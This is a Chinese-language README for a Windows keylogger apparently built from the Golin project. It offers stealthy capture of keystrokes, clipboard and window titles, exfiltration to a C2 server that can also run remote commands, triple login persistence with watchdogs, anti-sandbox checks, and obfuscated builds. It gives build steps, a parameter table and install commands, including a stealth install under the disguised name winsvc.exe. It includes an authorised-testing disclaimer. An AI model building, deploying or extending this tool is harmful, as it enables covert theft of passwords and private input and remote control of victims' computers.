# golin-keylogger

> 基于 [Golin](https://github.com/selinuxG/Golin) 的 Windows 键盘记录器：仅保留键盘记录模块，并进行了专项加强与混淆。
>
> 本工具**仅限经合法授权的安全测试使用**，使用前请务必阅读下方免责声明。

## 主要功能

### 记录能力

- 全局键盘钩子（WH_KEYBOARD_LL）实时记录按键，感知 Shift / CapsLock 状态（大小写、符号键、特殊键）
- 剪贴板内容变化监控
- 前台窗口标题追踪，每条记录附带输入发生时的窗口上下文

### 数据链路

- 本地落盘：日志写入用户主目录 `Golin/dump.txt`（按键 / 剪贴板 / 窗口事件）
- C2 上报：事件按批次 HTTP 上报至内置服务端；失败按 2s/4s 退避重试，最终失败写入离线队列 `spool.jsonl`，下次启动自动补传
- 心跳与远程任务：定期心跳保持在线，拉取服务端下发的命令在本机执行并回传结果；间隔带 ±25% 随机抖动，降低固定周期 beacon 特征

### 持久化

- `--install` 部署三重登录自启：启动文件夹快捷方式 + `HKCU\...\Run` 注册表项 + ONLOGON 计划任务（wscript.exe 静默启动，全程无控制台窗口），互为冗余
- 看门狗与主实例互保：任意一侧被结束，均由另一侧按间隔秒级拉起
- `--uninstall` 一键清理快捷方式、注册表项、计划任务、进程与副本文件
- 单实例命名互斥体保护，重复拉起静默退出

### 隐蔽与混淆

- `--stealth` 反沙箱检查：系统运行时间 / 物理内存 / 逻辑处理器 / 鼠标活动四项环境检查，全部通过前不执行任何敏感动作，超时静默退出；阈值均可调
- 源码级字符串 XOR 混淆：API 名称与关键字符串不以明文出现在二进制中
- C2 服务端地址、令牌等配置以 AES-256-GCM 密态内置，每次构建随机密钥
- 可选 garble 构建：`-tiny -seed=random -literals`，每次构建二进制指纹不同
- `windowsgui` 子系统 + 隐藏窗口启动，运行全程无控制台窗口

## 构建

环境要求：Windows + Go 1.26+；建议安装 [garble](https://github.com/burrowers/garble) 以获得更强的混淆效果。

```bat
build.bat          :: 构建客户端 golin.exe（生成图标资源 + 随机 C2 密钥 + garble 混淆）
build_server.bat   :: 构建 C2 服务端（Windows c2server.exe + Linux c2server）
```

自定义 C2 服务端：编辑 `c2config/config.go` 中的 `ServerURL` / `Token`，运行 `go run ./tools/secretgen` 重新生成密文数据，再重编译客户端与服务端（两端必须一致）。

## 用法

```bat
:: 直接运行（记录到本地 dump.txt 并上报内置 C2）
golin.exe keylogger

:: 安装持久化（副本名 winsvc.exe，看门狗每 5 秒检查一次）
golin.exe keylogger --install --pname winsvc.exe --every 5

:: 隐蔽模式安装（低配虚拟机靶机可调低阈值）
golin.exe keylogger --install --pname winsvc.exe --every 5 --stealth --stealth-mem 2 --stealth-cpu 1 --stealth-uptime 1

:: 卸载
golin.exe keylogger --uninstall

:: C2 服务端（默认监听 :8080，数据落盘 ./data）
c2server.exe -addr :8080 -dir ./data
```

### 参数说明

| 参数 | 默认值 | 说明 |
| --- | --- | --- |
| `--install` | - | 安装持久化（复制自身 + 三重自启 + 看门狗）后退出 |
| `--uninstall` | - | 卸载持久化并清理进程与文件 |
| `--watchdog` | - | 看门狗模式（内部使用） |
| `--pname` | winsvc.exe | 持久化副本文件名，可自定义降低路径特征 |
| `--every` | 5 | 看门狗检查间隔（秒） |
| `--stealth` | - | 隐蔽模式：通过反沙箱检查前不执行任何敏感动作 |
| `--delay` | 300 | 反沙箱检查最长等待秒数，超时静默退出 |
| `--stealth-uptime` | 10 | 反沙箱检查要求系统最少运行分钟数 |
| `--stealth-mem` | 4 | 反沙箱检查要求最小物理内存（GB） |
| `--stealth-cpu` | 2 | 反沙箱检查要求最小逻辑处理器数 |
| `--interval` | 30 | 上报时间间隔（秒） |
| `--batch` | 100 | 攒够多少条事件强制上报 |
| `--heartbeat` | 15 | 心跳 / 拉取任务间隔（秒） |
| `--debug` | - | 诊断模式，关键步骤日志写入 `%TEMP%\golin_debug.log`（仅排查用） |

## 免责声明

本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。
在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。
如您在使用本工具的过程中存在任何非法行为，您需自行承担相应一切后果。

## 项目参考

本项目参考 [Golin](https://github.com/selinuxG/Golin)，仅保留键盘记录模块，并进行了专项加强与混淆；键盘钩子核心逻辑参考 [uknowsec/keylogger](https://github.com/uknowsec/keylogger)，特此感谢。

## License

[MIT](LICENSE)
